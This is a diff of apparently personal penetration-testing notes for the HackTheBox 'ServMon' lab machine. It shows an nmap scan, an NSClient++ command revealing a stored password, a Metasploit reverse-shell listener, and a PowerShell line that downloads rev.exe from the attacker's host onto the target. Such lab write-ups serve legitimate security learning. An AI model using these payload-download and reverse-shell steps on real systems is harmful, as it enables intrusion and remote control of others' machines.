@@ -1,4 +1,7 @@
 ## ServMon
+#### 遇到的问题
+#### 1.//执行了这条命令之后，打开网页的登录窗口就简单多了
+![图片](images/2026021301.png)
 ```
 [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.227.77 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 [★]$ nmap -p$ports -sC -sV 10.129.227.77
@@ -540,7 +543,7 @@ nadine@SERVMON C:\Program Files\NSClient++>dir
               33 File(s)     53,145,227 bytes
                7 Dir(s)   6,114,344,960 bytes free
 
-nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display       
+nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display 
 Current password: ew2x6SsGTxjRwXOT
 
 nadine@SERVMON C:\Program Files\NSClient++>
@@ -935,3 +938,33 @@ LPORT => 1234
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
 [*] Started reverse TCP handler on 10.10.15.27:1234
 ```
+_____________
+```
+PS C:\programdata> powershell wget http://10.10.15.27:8011/rev.exe -outfile rev.
+exe
+PS C:\programdata> dir
+
+
+    Directory: C:\programdata
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/28/2022   6:32 PM                chocolatey
+d---s-        2/28/2022   3:55 PM                Microsoft
+d-----        2/28/2022   6:46 PM                NVMS-1000
+d-----        2/28/2022   6:24 PM                Package Cache
+d-----        2/25/2025   5:39 AM                regid.1991-06.com.microsoft    
+d-----        9/15/2018  12:19 AM                SoftwareDistribution
+d-----        2/25/2025   5:46 AM                ssh
+d-----        9/15/2018  12:19 AM                USOPrivate
+d-----       11/11/2019   6:52 PM                USOShared
+d-----        2/28/2022   5:44 PM                VMware
+-a----        2/13/2026   1:34 AM          55296 nc.exe
+-a----        2/13/2026   1:35 AM           7168 rev.exe
+
+
+PS C:\programdata>
+
+```
+#### 应该使用443端口
